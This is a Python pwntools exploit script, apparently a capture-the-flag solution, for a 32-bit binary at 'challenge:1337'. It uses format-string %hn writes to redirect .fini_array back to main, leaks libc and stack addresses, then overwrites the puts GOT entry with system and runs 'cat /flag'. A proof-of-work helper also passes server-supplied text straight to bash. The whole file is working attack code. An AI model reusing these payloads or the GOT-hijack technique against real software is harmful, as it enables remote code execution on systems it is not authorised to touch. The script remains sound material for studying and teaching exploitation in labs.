#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

context.binary = exe = ELF('/home/user/chal', checksec=False)
libc = ELF('/home/user/libc.so.6', checksec=False)


def convert(int_num):
    if int_num < 0:
        int_num = int_num + 2 ** 32
    return int_num

def craft_1(addr, value):
    target_low = value & 0xffff
    target_high = value >> 16
    payload = f'%{target_high-16}c%27$hn%{target_low-target_high}c%26$hn'.encode().ljust(28, b'-')
    payload += p32(addr) + p32(addr+2)
    return payload

def craft_2(addr_1, value_1, addr_2, value_2):
    target_low_1 = value_1 & 0xffff
    target_high_1 = ((value_1 & 0xffff0000) >> 16)
    target_low_2 = (value_2 & 0xffff)
    target_high_2 = ((value_2 & 0xffff0000) >> 16)

    if target_low_1 < target_low_2:
        write_1 = target_low_1
        idx_1 = 31
        write_2 = target_low_2
        idx_2 = 33
    else:
        write_1 = target_low_2
        idx_1 = 33
        write_2 = target_low_1
        idx_2 = 31

    payload = f'%{target_high_1}c%32$hn%{write_1-target_high_1}c%{idx_1}$hn'
    payload += f'%{write_2-write_1}c%{idx_2}$hn%{target_high_2-write_2}c%34$hn'
    payload = payload.encode().ljust(56, b'-')
    payload += p32(addr_1) + p32(addr_1+2) + p32(addr_2) + p32(addr_2+2)
    return payload


def handle_pow(r):
    r.recvline()
    challenge = r.recvline().decode('ascii').strip()
    log.info(f'Solving pow -> {challenge}')
    p = pwnlib.tubes.process.process(['bash', '-c', challenge])
    solution = p.recvline().strip()
    p.close()
    r.recvuntil(b'solution: ')
    r.sendline(solution)


while True:
    io = pwnlib.tubes.remote.remote('challenge', 1337)
    tmp_data = io.recv(len('proof'), timeout=2)
    if tmp_data == b'proof':
        handle_pow(io)
    else:
        io.unrecv(tmp_data)

    try:
        libc.address = 0
        fini_array = exe.get_section_by_name('.fini_array').header.sh_addr
        payload = b'%c%*----' + craft_1(fini_array, exe.sym['main'])
        payload += b'69' + b"%c"*7 + b"%*"
        io.sendlineafter(b'message: ', payload)

        io.recvuntil(b'is:\n')
        io.recv(2)
        libc.address = convert(int(io.recv(10))) - libc.sym['stdout']

        io.recvuntil(b'69')
        io.recv(8)
        buffer = convert(int(io.recvline(keepends=False)))

        log.info(f'buffer address: {hex(buffer)}')
        log.info(f'libc base: {hex(libc.address)}')

        payload = craft_2(buffer-88, exe.sym['main'], exe.got['puts'], libc.sym['system'])
        io.sendafter(b'message: ', payload)

        io.sendlineafter(b'message: ', b'cat /flag')
        buf = io.recvuntil(b'}', timeout=2)
        print(buf)
    except EOFError:
        io.close()
        continue

    exit(0 if 'cr3{' in buf.decode() else 1)